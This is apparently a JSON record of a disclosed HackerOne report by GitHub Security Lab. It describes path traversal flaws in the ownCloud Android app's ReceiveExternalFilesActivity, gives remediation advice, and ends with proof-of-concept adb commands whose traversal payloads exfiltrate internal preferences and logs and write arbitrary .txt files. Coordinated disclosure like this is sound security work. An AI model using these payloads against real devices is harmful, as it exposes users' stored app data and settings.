@@ -1,0 +1,140 @@
+{
+  "id": 1650270,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjUwMjcw",
+  "url": "https://hackerone.com/reports/1650270",
+  "title": "GitHub Security Lab (GHSL) Vulnerability Report: Insufficient path validation in ReceiveExternalFilesActivity.java (GHSL-2022-060)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2022-07-26T13:38:15.202Z",
+  "submitted_at": "2022-07-26T13:38:15.270Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "atorralba",
+    "url": "/atorralba",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/jz9ee2cfuc3li9d3tml3dxnrhxh7/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 3059,
+    "url": "https://hackerone.com/owncloud",
+    "handle": "owncloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/059/d31dc64427bbbf2e428a0b0b97bce59b98d2ba0d_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "ownCloud",
+      "twitter_handle": "ownCloud",
+      "website": "https://www.owncloud.com",
+      "about": "ownCloud GmbH is the company behind the ownCloud Project - the most downloaded open source project for data and file sync, share and view."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-24804"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-01-16T16:18:07.796Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-12-22T13:29:02.865Z",
+  "team_member_agreed_on_going_public_at": "2023-01-16T16:18:07.646Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [Owncloud Android app](https://github.com/owncloud/android).\n\nWe are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.\n\nIf at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2022-059` or `GHSL-2022-060` as a reference).\n\nIf you are _NOT_ the correct point of contact for this report, please let us know!\n\n## Summary\n\nThe Owncloud Android app handles externally-provided files in the activity `ReceiveExternalFilesActivity`, where potentially malicious file paths are not properly sanitized, allowing attackers to read from and write to the application's internal storage.\n\n## Details\n\n### Access to arbitrary files in the app's internal storage fix bypass\n\n`ReceiveExternalFilesActivity` handles the upload of files provided by third party components in the device. The received data can be set arbitrarily by attackers, causing some functions that handle file paths to have unexpected behavior. https://hackerone.com/reports/377107 shows how that could be exploited in the past, using the `android.intent.extra.STREAM` extra to force the application to upload its internal files, like `com.owncloud.android_preferences.xml`. To fix it, the following code was added:\n\n[`ReceiveExternalFilesActivity.java:521`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/ui/activity/ReceiveExternalFilesActivity.java#L521)\n\n```java\nprivate void prepareStreamsToUpload() {\n    // --snip--\n\n    for (Uri stream : mStreamsToUpload) {\n        String streamToUpload = stream.toString();\n        if (streamToUpload.contains(\"/data\") &&\n                streamToUpload.contains(getPackageName()) &&\n                !streamToUpload.contains(getCacheDir().getPath())\n        ) {\n            finish();\n        }\n    }\n}\n```\n\nThis protection can be bypassed in two ways:\n\n* Using the path returned by `getCacheDir()` in the payload, e.g. `\"file:///data/user/0/com.owncloud.android/cache/../shared_prefs/com.owncloud.android_preferences.xml\"`.\n* Using a content provider URI that uses the `org.owncloud.files` provider to access the app's internal `file` folder, e.g. `\"content://org.owncloud.files/files/owncloud/logs/owncloud.2022-07-25.log\"`.\n\nWith those payloads, the original issue can be still exploited with the same impact.\n\n### Write of arbitrary `.txt` files in the app's internal storage\n\nAdditionally, there's another insufficient path validation when uploading a plain text file that allows to write arbitrary files in the app's internal storage.\n\nWhen uploading a plain text file, the following code is executed, using the user-provided text at `input` to save the file:\n\n[`ReceiveExternalFilesActivity:920`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/ui/activity/ReceiveExternalFilesActivity.java#L920)\n\n```java\nprivate void showUploadTextDialog() {\n        // --snip--\n        final TextInputEditText input = dialogView.findViewById(R.id.inputFileName);\n        // --snip--\n        setFileNameFromIntent(alertDialog, input);\n        alertDialog.setOnShowListener(dialog -> {\n            Button button = alertDialog.getButton(AlertDialog.BUTTON_POSITIVE);\n            button.setOnClickListener(view -> {\n                // --snip--\n                } else {\n                    fileName += \".txt\";\n                    Uri fileUri = savePlainTextToFile(fileName);\n                    mStreamsToUpload.clear();\n                    mStreamsToUpload.add(fileUri);\n                    uploadFiles();\n                }\n                inputLayout.setErrorEnabled(error != null);\n                inputLayout.setError(error);\n            });\n        });\n        alertDialog.show();\n    }\n```\n\nBy reviewing `savePlainTextToFile`, it can be seen that the plain text file is momentarily saved in the app's cache, but the destination path is built using the user-provided `fileName`:\n\n[`ReceiveExternalFilesActivity:983`](https://github.com/owncloud/android/blob/73f152c242dd818b9c4de267fe072338a35ff2ba/owncloudApp/src/main/java/com/owncloud/android/ui/activity/ReceiveExternalFilesActivity.java#L983)\n\n```java\nprivate Uri savePlainTextToFile(String fileName) {\n    Uri uri = null;\n    String content = getIntent().getStringExtra(Intent.EXTRA_TEXT);\n    try {\n        File tmpFile = new File(getCacheDir(), fileName); // here\n        FileOutputStream outputStream = new FileOutputStream(tmpFile);\n        outputStream.write(content.getBytes());\n        outputStream.close();\n        uri = Uri.fromFile(tmpFile);\n\n    } catch (IOException e) {\n        Timber.w(e, \"Failed to create temp file for uploading plain text: %s\", e.getMessage());\n    }\n    return uri;\n}\n```\n\nAn attacker can exploit this using a path traversal attack to write arbitrary text files into the app's internal storage or other restricted directories accessible by it. The only restriction is that the file will always have the `.txt` extension, limiting the impact.\n\n## Remediation\n\nValidate user input before using it to construct a file path. Ideally, follow these rules:\n\n* Do not allow more than a single `.` character.\n* Do not allow directory separators such as `/` or `\\` (depending on the file system).\n* Do not rely on simply replacing problematic sequences such as `../`. For example, after applying this filter to\n`.../...//` the resulting string would still be `../`.\n* Ideally use an allowlist of known good patterns.\n\n## Resources\n\nThe following PoC demonstrates how to upload arbitrary files from the app's internal storage:\n\n```\nadb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t \"text/plain\" -a \"android.intent.action.SEND\" --eu \"android.intent.extra.STREAM\" \"file:///data/user/0/com.owncloud.android.debug/cache/../shared_prefs/com.owncloud.android.debug_preferences.xml\"\n```\n\nThe following PoC demonstrates how to upload arbitrary files from the app's internal `files` directory:\n\n```\nadb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t \"text/plain\" -a \"android.intent.action.SEND\" --eu \"android.intent.extra.STREAM\" \"content://org.owncloud.files/files/owncloud/logs/owncloud.2022-07-25.log\"\n```\n\nThe following PoC demonstrates how to write an arbitrary `test.txt` text file to the app's internal storage:\n\n```\nadb shell am start -n com.owncloud.android.debug/com.owncloud.android.ui.activity.ReceiveExternalFilesActivity -t \"text/plain\" -a \"android.intent.action.SEND\" --es \"android.intent.extra.TEXT\" \"Arbitrary contents here\" --es \"android.intent.extra.TITLE\" \"../shared_prefs/test\"\n```\n\n## GitHub Security Advisories\n\nWe recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).\n\n## Credit\n\nThese issues were discovered and reported by the CodeQL team member [@atorralba (Tony Torralba)](https://github.com/atorralba).\n\n## Contact\n\nYou can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2022-059` or `GHSL-2022-060` in any communication regarding these issues.\n\n## Disclosure Policy\n\nThis report is subject to our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).\n\n## Impact\n\nThese issues may lead to information disclosure when uploading the app's internal files, and to arbitrary file write when uploading plain text files (although limited by the `.txt` extension).",
+  "bounty_amount": "50.0",
+  "formatted_bounty": "$50",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-01-21T13:29:02.948Z",
+  "allow_singular_disclosure_after": -103433632.54844517,
+  "singular_disclosure_allowed": true,
+  "vote_count": 14,
+  "voters": [
+    "skoll101",
+    "zy9ard3",
+    "sheikhrishad0",
+    "shreyaschavhan",
+    "ali",
+    "shubham_srt",
+    "shivammusic",
+    "jpmoban",
+    "reztricker9029",
+    "yoshiking",
+    "and 4 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "changed",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 469,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.owncloud.android",
+    "max_severity": "medium"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
